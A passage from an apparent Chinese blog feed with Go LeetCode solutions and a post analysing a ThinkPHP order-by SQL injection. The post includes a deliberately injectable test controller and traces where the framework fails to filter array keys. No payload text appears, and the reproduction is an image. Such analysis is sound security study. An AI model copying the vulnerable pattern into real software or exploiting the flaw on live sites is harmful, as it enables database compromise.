class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> helper(root.Left, min, root) &amp;&amp; helper(root.Right, root, max)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改改代码就行了。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ans <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxSumBST</span><span class="params">(root *TreeNode)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    helper(root)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">helper</span><span class="params">(root *TreeNode)</span> <span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">bool</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> root == <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> math.MinInt32, math.MaxInt32, <span class="number">0</span>, <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lMax, lMin, lSum, lValid := helper(root.Left)</span><br><span class="line">    rMax, rMin, rSum, rValid := helper(root.Right)</span><br><span class="line"></span><br><span class="line">    sum, valid := <span class="number">0</span>, <span class="literal">false</span></span><br><span class="line">    <span class="keyword">if</span> lValid &amp;&amp; rValid &amp;&amp; lMax &lt; root.Val &amp;&amp; root.Val &lt; rMin &#123;</span><br><span class="line">    sum = lSum + root.Val + rSum</span><br><span class="line">    ans = max(ans, sum)</span><br><span class="line">    valid = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max(rMax, root.Val), min(lMin, root.Val), sum, valid  <span class="comment">// 更新边界</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(x, y <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> x &gt; y &#123;</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">min</span><span class="params">(x, y <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> x &lt; y &#123;</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;上升下降字符串&quot;&gt;&lt;a href=&quot;#上升下降字符串&quot; class=&quot;headerlink&quot; title=&quot;上升下降字符串&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode-cn.com/problems/increasing-decreasing-s
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode Weekly Contest 177</title>
    <link href="https://wywwzjj.top/2020/02/23/LeetCode-Weekly-Contest-177/"/>
    <id>https://wywwzjj.top/2020/02/23/LeetCode-Weekly-Contest-177/</id>
    <published>2020-02-23T04:34:38.000Z</published>
    <updated>2020-03-22T10:11:48.062Z</updated>
    
    <content type="html"><![CDATA[<h2 id="日期之间隔几天"><a href="#日期之间隔几天" class="headerlink" title="日期之间隔几天"></a><a href="https://leetcode-cn.com/problems/number-of-days-between-two-dates/" target="_blank" rel="noopener">日期之间隔几天</a></h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>请你编写一个程序来计算两个日期之间隔了多少天。</p><p>日期以字符串形式给出，格式为 YYYY-MM-DD，如示例所示。</p><p><strong>示例 1：</strong></p><p>输入：date1 = “2019-06-29”, date2 = “2019-06-30”<br>输出：1</p><p><strong>示例 2：</strong></p><p>输入：date1 = “2020-01-15”, date2 = “2019-12-31”<br>输出：15</p><p><strong>提示：</strong></p><p>给定的日期是 1971 年到 2100 年之间的有效日期。</p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>直接调用库函数了。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">daysBetweenDates</span><span class="params">(date1 <span class="keyword">string</span>, date2 <span class="keyword">string</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    t1, _ := time.Parse(<span class="string">"2006-01-02"</span>, date1)</span><br><span class="line">    t2, _ := time.Parse(<span class="string">"2006-01-02"</span>, date2)</span><br><span class="line">    ans := t1.Sub(t2).Hours()</span><br><span class="line">    <span class="keyword">if</span> ans &gt; <span class="number">0</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">int</span>(ans) / <span class="number">24</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="keyword">int</span>(ans) / <span class="number">24</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="验证二叉树"><a href="#验证二叉树" class="headerlink" title="验证二叉树"></a><a href="https://leetcode-cn.com/problems/validate-binary-tree-nodes/" target="_blank" rel="noopener">验证二叉树</a></h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>二叉树上有 <code>n</code> 个节点，按从 <code>0</code> 到 <code>n - 1</code> 编号，其中节点 <code>i</code> 的两个子节点分别是 <code>leftChild[i]</code> 和 <code>rightChild[i]</code>。</p><p>只有 <strong>所有</strong> 节点能够形成且 <strong>只</strong> 形成 <strong>一颗</strong> 有效的二叉树时，返回 <code>true</code>；否则返回 <code>false</code>。</p><p>如果节点 <code>i</code> 没有左子节点，那么 <code>leftChild[i]</code> 就等于 <code>-1</code>。右子节点也符合该规则。</p><p>注意：节点没有值，本问题中仅仅使用节点编号。</p><p><strong>示例 1：</strong></p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/02/23/1503_ex1.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n = 4, leftChild = [1,-1,3,-1], rightChild = [2,-1,-1,-1]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/02/23/1503_ex2.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n = 4, leftChild = [1,-1,3,-1], rightChild = [2,3,-1,-1]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/02/23/1503_ex3.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n = 2, leftChild = [1,0], rightChild = [-1,-1]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure><p><strong>示例 4：</strong></p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/02/23/1503_ex4.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n = 6, leftChild = [1,-1,-1,4,-1,-1], rightChild = [2,-1,-1,5,-1,-1]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= n &lt;= 10^4</code></li><li><code>leftChild.length == rightChild.length == n</code></li><li><code>-1 &lt;= leftChild[i], rightChild[i] &lt;= n - 1</code></li></ul><h3 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TODO</span></span><br></pre></td></tr></table></figure><h2 id="最接近的因数"><a href="#最接近的因数" class="headerlink" title="最接近的因数"></a><a href="https://leetcode-cn.com/problems/closest-divisors/" target="_blank" rel="noopener">最接近的因数</a></h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>给你一个整数 <code>num</code>，请你找出同时满足下面全部要求的两个整数：</p><ul><li><p>两数乘积等于  <code>num + 1</code> 或 <code>num + 2</code></p></li><li><p>以绝对差进行度量，两数大小最接近</p></li></ul><p>你可以按任意顺序返回这两个整数。</p><p><strong>示例 1：</strong></p><p>输入：num = 8<br>输出：[3,3]<br>解释：对于 num + 1 = 9，最接近的两个因数是 3 &amp; 3；对于 num + 2 = 10, 最接近的两个因数是 2 &amp; 5，因此返回 3 &amp; 3 。</p><p><strong>示例 2：</strong></p><p>输入：num = 123<br>输出：[5,25]</p><p><strong>示例 3：</strong></p><p>输入：num = 999<br>输出：[40,25]</p><p><strong>提示：</strong></p><p>1 &lt;= num &lt;= 10^9</p><h3 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h3><p>最简单的思路，从平方根开始，两数之差一定是最小的。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">closestDivisors</span><span class="params">(num <span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    num1, num2 := num+<span class="number">1</span>, num+<span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> ans := <span class="keyword">int</span>(math.Sqrt(<span class="keyword">float64</span>(num2))); ans &gt; <span class="number">0</span>; ans-- &#123;</span><br><span class="line">    <span class="keyword">if</span> (num1)%ans == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> []<span class="keyword">int</span>&#123;ans, num1 / ans&#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num2)%ans == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> []<span class="keyword">int</span>&#123;ans, num2 / ans&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="形成三的最大倍数"><a href="#形成三的最大倍数" class="headerlink" title="形成三的最大倍数"></a><a href="https://leetcode-cn.com/problems/largest-multiple-of-three/" target="_blank" rel="noopener">形成三的最大倍数</a></h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>给你一个整数数组 <code>digits</code>，你可以通过按任意顺序连接其中某些数字来形成 <strong>3</strong> 的倍数，请你返回所能得到的最大的 3 的倍数。</p><p>由于答案可能不在整数数据类型范围内，请以字符串形式返回答案。</p><p>如果无法得到答案，请返回一个空字符串。</p><p><strong>示例 1：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：digits = [8,1,9]</span><br><span class="line">输出：&quot;981&quot;</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：digits = [8,6,7,1,0]</span><br><span class="line">输出：&quot;8760&quot;</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：digits = [1]</span><br><span class="line">输出：&quot;&quot;</span><br></pre></td></tr></table></figure><p><strong>示例 4：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：digits = [0,0,0,0,0,0]</span><br><span class="line">输出：&quot;0&quot;</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= digits.length &lt;= 10^4</code></li><li><code>0 &lt;= digits[i] &lt;= 9</code></li><li>返回的结果不应包含不必要的前导零。</li></ul><h3 id="解法-3"><a href="#解法-3" class="headerlink" title="解法"></a>解法</h3><p>一开始想了好久用 DP 做，后面发现只是个普通的数学题 。</p><p>如果一个数的各位数之和相加是 3 的倍数，则它本身就是 3 的倍数，然后从大到小排序即可。</p><p>剩下的问题就变成，在数组中找到尽可能多的数且数值最大。</p><p>数组中的所有数可分成三类：num % 3 == 0, 1, 2。</p><p>若和模 3 余 1，则去掉余数为 1 的那类数里最小的一个数即可，不行就删两个余 2 的。余 2 同理。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">largestMultipleOfThree</span><span class="params">(digits []<span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="comment">// 先处理特殊情况</span></span><br><span class="line">    s := sum(digits)</span><br><span class="line">    <span class="keyword">if</span> s == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> s%<span class="number">3</span> == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> genMaxString(digits)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 余数分类</span></span><br><span class="line">    remainder := <span class="built_in">make</span>([][]<span class="keyword">int</span>, <span class="number">3</span>) </span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> remainder &#123;</span><br><span class="line">    remainder[i] = []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> digits &#123;</span><br><span class="line">    mod := digits[i] % <span class="number">3</span></span><br><span class="line">    remainder[mod] = <span class="built_in">append</span>(remainder[mod], digits[i])</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在可拿的情况下，保证拿的都是最大的</span></span><br><span class="line">    sort.Ints(remainder[<span class="number">1</span>])</span><br><span class="line">    sort.Ints(remainder[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    resDigits := remainder[<span class="number">0</span>] <span class="comment">// 以余 0 为基础</span></span><br><span class="line"></span><br><span class="line">    len1, len2 := <span class="built_in">len</span>(remainder[<span class="number">1</span>]), <span class="built_in">len</span>(remainder[<span class="number">2</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 尽可能的多拿，[1,1,1,2]</span></span><br><span class="line">    <span class="keyword">if</span> s%<span class="number">3</span> == <span class="number">1</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> len1 &gt; <span class="number">0</span> &#123;</span><br><span class="line">    remainder[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">-1</span> <span class="comment">// -1 代表删除</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> len2 &gt; <span class="number">1</span> &#123;</span><br><span class="line">    remainder[<span class="number">2</span>][<span class="number">0</span>] = <span class="number">-1</span></span><br><span class="line">    remainder[<span class="number">2</span>][<span class="number">1</span>] = <span class="number">-1</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> len2 &gt; <span class="number">0</span> &#123;</span><br><span class="line">    remainder[<span class="number">2</span>][<span class="number">0</span>] = <span class="number">-1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> len1 &gt; <span class="number">1</span> &#123;</span><br><span class="line">    remainder[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">-1</span></span><br><span class="line">    remainder[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">-1</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    resDigits = <span class="built_in">append</span>(resDigits, remainder[<span class="number">1</span>]...)</span><br><span class="line">    resDigits = <span class="built_in">append</span>(resDigits, remainder[<span class="number">2</span>]...)</span><br><span class="line">    <span class="keyword">return</span> genMaxString(resDigits)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    ans := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> nums &#123;</span><br><span class="line">    ans += nums[i]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">genMaxString</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    ans := <span class="string">""</span></span><br><span class="line">    sort.Sort(sort.IntSlice(nums))</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(nums); i++ &#123;</span><br><span class="line">    <span class="keyword">if</span> nums[i] == <span class="number">-1</span> &#123; <span class="comment">// -1 代表删除</span></span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    ans = strconv.Itoa(nums[i]) + ans</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;日期之间隔几天&quot;&gt;&lt;a href=&quot;#日期之间隔几天&quot; class=&quot;headerlink&quot; title=&quot;日期之间隔几天&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode-cn.com/problems/number-of-days-between-
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 3.X / 5.X order by 注入</title>
    <link href="https://wywwzjj.top/2020/01/30/ThinkPHP-3-X-5-X-order-by-%E6%B3%A8%E5%85%A5/"/>
    <id>https://wywwzjj.top/2020/01/30/ThinkPHP-3-X-5-X-order-by-注入/</id>
    <published>2020-01-30T04:42:30.000Z</published>
    <updated>2020-03-22T10:11:48.078Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在 ThinkPHP 5.1.23 之前的版本中存在 SQL 注入漏洞，该漏洞是由于程序在处理 order by 后的参数时，未正确过滤处理数组的 key 值所造成。如果该参数用户可控，且当传递的数据为数组时，会导致漏洞的产生。</p><p>ThinkPHP 5.1 中的更新日志也可看到：V5.1.23（2018-8-23）改进<code>order</code>方法的数组方式解析，增强安全性。</p><p>同时受到影响的还有 3.2.3 及以下的版本。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.1.22 thinkphp5.1.22</span><br></pre></td></tr></table></figure><p>ThinkPHP 3.2.3 版本环境建议按官方文档操作，直接下载： <a href="https://www.kancloud.cn/manual/thinkphp/1680" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp/1680</a></p><p>配好数据库后，在 index.php 中加入测试代码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $order = input(<span class="string">'order'</span>);</span><br><span class="line">        $res = db(<span class="string">'user'</span>)-&gt;order($order)-&gt;find();</span><br><span class="line">        dump($res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user 是随便创建的表，看到该页面说明环境没问题。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbei8tc4eoj20d403j747.jpg" alt="image.png"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbeiakca6jj20x804k3yv.jpg" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="TP-5-1-x"><a href="#TP-5-1-x" class="headerlink" title="TP 5.1.x"></a>TP 5.1.x</h3><p>我们先来看一下正常的 SQL 查询流程。</p><p>ThinkPHP 提供了大量封装数据库操作的函数给开发者使用，但终究是要落实到生成 SQL 语句的。</p><p>Builder.php 中可看到这些实现细节，以 select 查询为例，TP 弄了一个查询模板，每次查询时替换成具体的值。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> $selectSql = <span class="string">'SELECT%DISTINCT% %FIELD% FROM %TABLE%%FORCE%%JOIN%%WHERE%%GROUP%%HAVING%%UNION%%ORDER%%LIMIT% %LOCK%%COMMENT%'</span>;</span><br></pre></td></tr></table></figure><p>select 语句替换操作，在这里生成 SQL 语句。既然 <code>parseOrder()</code> 有注入，其他的同样可能出现问题。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">(Query $query)</span> </span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">'%TABLE%'</span>, <span class="string">'%DISTINCT%'</span>, <span class="string">'%FIELD%'</span>, <span class="string">'%JOIN%'</span>, <span class="string">'%WHERE%'</span>, <span class="string">'%GROUP%'</span>, <span class="string">'%HAVING%'</span>, <span class="string">'%ORDER%'</span>, <span class="string">'%LIMIT%'</span>, <span class="string">'%UNION%'</span>, <span class="string">'%LOCK%'</span>, <span class="string">'%COMMENT%'</span>, <span class="string">'%FORCE%'</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">'table'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">'distinct'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">'field'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">'join'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">'where'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">'group'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">'having'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">'order'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">'limit'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">'union'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">'lock'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">'comment'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">'force'</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终在 Connection.php 中用 PDO 执行。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;PDOStatement = <span class="keyword">$this</span>-&gt;linkID-&gt;prepare($sql);</span><br><span class="line"><span class="keyword">$this</span>-&gt;PDOStatement-&gt;execute();</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getResult($pdo, $procedure);</span><br></pre></td></tr></table></figure><p>回到本文的重点，order by 处理，可看到 <code>order by</code> 与 <code>$array</code> 拼接一下就返回了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span><span class="params">(Query $query, $order)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($order)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">            $array[] = $val-&gt;getValue();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val)) &#123;</span><br><span class="line">            <span class="comment">// 有些分析是从这进去的，没这个必要，反而使 payload 复杂化</span></span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseOrderField($query, $key, $val);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">'[rand]'</span> == $val) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseRand($query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $sort) = explode(<span class="string">' '</span>, strpos($val, <span class="string">' '</span>) ? $val : $val . <span class="string">' '</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $sort = $val;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $sort    = strtoupper($sort);</span><br><span class="line">            $sort    = in_array($sort, [<span class="string">'ASC'</span>, <span class="string">'DESC'</span>], <span class="keyword">true</span>) ? <span class="string">' '</span> . $sort : <span class="string">''</span>;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="keyword">true</span>) . $sort;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">' ORDER BY '</span> . implode(<span class="string">','</span>, $array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 $val 非 ASC、DESC，将被直接清空。继续跟进 <code>parseKey()</code>，这个方法会随使用的数据库驱动类型变化。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Mysql.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span><span class="params">(Query $query, $key, $strict = false)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">return</span> $key;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($key <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">        <span class="keyword">return</span> $key-&gt;getValue();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $key = trim($key);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... 处理 json 字段和 table_name.filed 这种形式</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'*'</span> != $key &amp;&amp; ($strict || !preg_match(<span class="string">'/[,\'\"\*\(\)`.\s]/'</span>, $key))) &#123;</span><br><span class="line">        $key = <span class="string">'`'</span> . $key . <span class="string">'`'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单来说，经过这一步操作，由于$strict = true，$key 将被包一层反引号。</p><p>现在的问题就变成了：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> xxx <span class="keyword">from</span> xxx <span class="keyword">order</span> <span class="keyword">by</span> <span class="string">`$key`</span> <span class="keyword">limit</span> <span class="number">1</span>;  <span class="comment">-- limit 1 是自动拼接上的</span></span><br></pre></td></tr></table></figure><p>联合注入时，经常使用 <code>order by 4</code> 来判断字段数，当 4 被反引号包裹时还能起到同样的效果吗？没了。</p><p>也就是说至少得知道一个字段名，否则 order by 这里就会报错了。不能堆叠注入，待继续突破！</p><p>看下 V5.1.23 的补丁，order by 后的 <code>)</code> 没了，还能继续绕吗？</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === strpos($key, <span class="string">')'</span>) &amp;&amp; <span class="keyword">false</span> === strpos($key, <span class="string">'#'</span>)) &#123;</span><br><span class="line">    $sort    = strtoupper($sort);</span><br><span class="line">    $sort    = in_array($sort, [<span class="string">'ASC'</span>, <span class="string">'DESC'</span>], <span class="keyword">true</span>) ? <span class="string">' '</span> . $sort : <span class="string">''</span>;</span><br><span class="line">    $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="keyword">true</span>) . $sort;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TP-3-2-3"><a href="#TP-3-2-3" class="headerlink" title="TP 3.2.3"></a>TP 3.2.3</h3><p>这个版本就更简单了，相比 5 系列，连反引号都没有了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Driver.class.php</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span><span class="params">($order)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($order)) &#123;</span><br><span class="line">        $array = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($val);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($key) . <span 